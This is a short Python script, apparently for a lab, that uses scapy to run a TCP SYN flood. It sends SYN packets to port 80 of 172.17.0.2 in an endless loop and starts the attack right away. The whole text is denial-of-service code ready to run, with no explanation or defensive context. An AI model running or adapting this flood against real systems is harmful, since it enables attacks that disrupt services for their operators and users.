from scapy.all import *

target_ip = "172.17.0.2"

def syn_flood(target_ip):
    while True:
        send(IP(dst=target_ip)/TCP(dport=80, flags="S"), verbose=False)

syn_flood(target_ip)
